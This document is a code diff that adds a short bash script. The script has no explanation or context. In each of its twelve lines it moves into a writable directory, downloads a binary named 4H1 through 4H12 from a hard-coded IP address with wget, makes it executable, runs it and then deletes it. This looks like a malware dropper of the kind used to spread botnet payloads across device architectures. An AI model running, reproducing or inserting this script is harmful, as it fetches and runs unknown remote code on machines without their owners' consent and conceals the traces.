@@ -1,0 +1,13 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H1; chmod +x 4H1; ./4H1; rm -rf 4H1
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H2; chmod +x 4H2; ./4H2; rm -rf 4H2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H3; chmod +x 4H3; ./4H3; rm -rf 4H3
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H4; chmod +x 4H4; ./4H4; rm -rf 4H4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H5; chmod +x 4H5; ./4H5; rm -rf 4H5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H6; chmod +x 4H6; ./4H6; rm -rf 4H6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H7; chmod +x 4H7; ./4H7; rm -rf 4H7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H8; chmod +x 4H8; ./4H8; rm -rf 4H8
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H9; chmod +x 4H9; ./4H9; rm -rf 4H9
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H10; chmod +x 4H10; ./4H10; rm -rf 4H10
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H11; chmod +x 4H11; ./4H11; rm -rf 4H11
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.82/4H12; chmod +x 4H12; ./4H12; rm -rf 4H12
